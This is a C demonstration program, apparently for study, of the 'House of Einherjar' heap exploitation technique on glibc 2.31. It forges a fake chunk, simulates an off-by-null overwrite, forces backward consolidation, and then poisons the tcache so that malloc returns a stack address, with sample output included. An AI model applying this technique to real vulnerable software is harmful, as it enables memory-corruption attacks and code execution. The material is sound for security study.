#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<assert.h>
#include<malloc.h>

int main(){
	long target = 0x6666666;
	printf("our taget_addr is @ %p\n",&target);
	char *A = malloc(0x20);
	char *B = malloc(0x28);
	char *C = malloc(0x80);
	char *D = malloc(0x10);
	
	long long *p_A = (long long*)A;
	/*
	make a fake chunk
	And
	bypass unlink detect
	*/
	char *fake_chunk = A+0x10;
	printf("fake_chunk's mem is @ %p\n",fake_chunk);
	p_A[0] = 0;
	p_A[1] = 0x50;
	p_A[2] = &p_A[0];
	p_A[3] = &p_A[0];

	// off-by-null
	long long *p_B = (long long*)B;
	p_B[4] = 0x50; // C's prev_size
	p_B[5] = 0x90;// C's size 
	
	
	// fill tcache
	char *p_tcache[20];
	for(int i=0;i<7;i++){
		p_tcache[i] = malloc(0x80); // size equal to chunk C
	}
	for(int i=0;i<7;i++){
		free(p_tcache[i]);
	}
	// free C to unlink and merge
	free(C);
	
	// add back A+B+C
	char *p = malloc(0xd0); // fake_chunk's size now: 0xe1
	printf("now we add back A+B+C, where *p is @ %p\n",p);
	assert(p==fake_chunk);

	/* 
	leverage overlapping
	tcache poisoning	
	*/
	char *pad = malloc(0x28); // count>0
	free(pad);
	free(B);
	// tcache: 0x30 [ 2] : B->pad
	long long *p_p = (long long*)p;
	p_p[0] = 0;p_p[1] = 0;
	p_p[2] = 0;
	p_p[3] = 0x30; // B's size
	p_p[4] = &target; // hijack *next
	// B->target
	char *b = malloc(0x28);
	char *s = malloc(0x28);
	printf("FInally we add back target_addr @ %p!!!\n",s);
	assert(&target==s);
	return 0;
}
/*
➜  glibc-2.31 git:(main) ✗ ./house_of_einherjar                             
our taget_addr is @ 0x7fffe71699a8
fake_chunk's mem is @ 0x5557f99c16c0
now we add back A+B+C, where *p is @ 0x5557f99c16c0
FInally we add back target_addr @ 0x7fffe71699a8!!!
*/
